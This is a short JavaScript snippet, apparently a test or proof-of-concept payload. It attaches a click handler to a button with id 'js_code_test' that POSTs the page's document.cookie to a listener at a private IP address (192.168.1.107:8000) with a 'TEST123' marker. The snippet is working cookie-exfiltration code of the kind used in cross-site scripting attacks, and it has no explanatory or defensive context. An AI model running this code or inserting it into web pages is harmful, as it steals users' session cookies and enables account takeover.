const button = document.getElementById("js_code_test");





function dos() {
  return document.cookie
}









button.addEventListener("click", () => {


  fetch("http://192.168.1.107:8000/ping?marker=TEST123", { method: "POST", headers: { "Content-Type": "text/plain" }, body: document.cookie })


});




